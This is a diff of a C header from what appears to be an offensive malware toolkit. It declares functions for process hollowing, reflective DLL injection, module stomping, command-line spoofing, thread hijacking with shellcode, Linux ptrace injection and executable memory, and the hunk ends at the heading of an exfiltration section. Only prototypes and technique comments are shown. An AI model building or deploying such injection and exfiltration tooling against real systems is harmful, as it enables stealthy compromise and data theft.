@@ -354,34 +354,21 @@ bool jocky_process_hollow(const wchar_t* target_path,
                           const uint8_t* payload,
                           size_t payload_size);
 
-/* Module stomping — find module_name in pid's loaded-module list, make its
- * region RWX, overwrite with payload (headers + sections), execute at EP. */
+/* Reflective DLL injection: load PE from memory */
+bool jocky_reflective_inject(void* hProcess, const uint8_t* dll_data, size_t dll_size);
+bool jocky_reflective_load_self(const uint8_t* dll_data, size_t dll_size, void** outModule);
+
+/* Module stomping: overwrite a loaded DLL in a remote process */
 bool jocky_module_stomp(uint32_t pid,
                         const wchar_t* module_name,
                         const uint8_t* payload,
                         size_t payload_size);
-
-/* Reflective DLL injection — write dll_bytes to RWX memory in pid, then
- * CreateRemoteThread at the "ReflectiveLoader" export inside the DLL.
- * Returns false if the DLL has no "ReflectiveLoader" export. */
-bool jocky_rdll_inject(uint32_t pid,
-                       const uint8_t* dll_bytes,
-                       size_t dll_size);
-
-/* Process parameter poisoning (P³) — overwrite PEB.RTL_USER_PROCESS_PARAMETERS
- * CommandLine and/or ImagePathName in the target process.  Pass NULL for any
- * field you don't want to change. */
-bool jocky_p3_poison(uint32_t pid,
-                     const wchar_t* fake_cmdline,
-                     const wchar_t* fake_image_path);
-
-/* Thread execution hijacking — find a thread in pid, suspend it, inject
- * shellcode into an RWX allocation, redirect the thread's RIP to it, resume. */
-bool jocky_thread_hijack(uint32_t pid,
-                          const uint8_t* shellcode,
-                          size_t shellcode_size);
-
-#endif /* _WIN32 (execution) */
+#else
+/* Linux process injection via ptrace */
+bool jocky_linux_inject_code(int target_pid, void* function_ptr, void** remote_addr);
+void* jocky_linux_alloc_rwx(size_t size);
+bool jocky_linux_memexec(const uint8_t* code, size_t code_size, void** entry_point);
+#endif /* _WIN32 */
 
 /* ============================================================================
  * Exfiltration  *(Windows only)*
